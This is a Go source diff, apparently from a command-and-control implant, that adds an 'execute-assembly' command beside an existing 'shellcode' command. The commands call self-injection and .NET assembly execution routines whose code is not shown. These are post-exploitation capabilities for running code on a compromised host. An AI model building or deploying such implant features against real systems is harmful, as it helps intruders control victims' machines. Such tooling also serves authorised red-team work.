@@ -4,11 +4,13 @@ import (
 	"bytes"
 	"encoding/binary"
 	"encoding/json"
+	//"fmt"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"os"
 	"os/user"
+
 	//"log" // only for debugging
 	"strconv"
 	"strings"
@@ -163,7 +165,7 @@ func validateArgs(cmdArgs []string) bool {
 func RunCommand(command string) string {
 	output := ""
 	cmdArgs := strings.Fields(command)
-	//log.Println([]byte(command))
+	//log.Println(command)
 
 	if validateArgs(cmdArgs) {
 		switch (utils.Strip(cmdArgs[0])){
@@ -254,6 +256,13 @@ func RunCommand(command string) string {
 			output = strings.Trim(output, ",")
 		case "shellcode":
 			output = functions.SelfInject(cmdArgs[1])
+		case "execute-assembly":
+			params := strings.Split(command[17:], ";")
+			if len(params[0]) < 10 { // could just check for empty string but eh
+				output = "[!] Error: No file specified."
+			} else {
+				output = functions.ExecuteAssembly(params[0], strings.Split(params[1], " "))
+			}
 		}
 	} else {
 		output = "[!] Insufficient arguments"
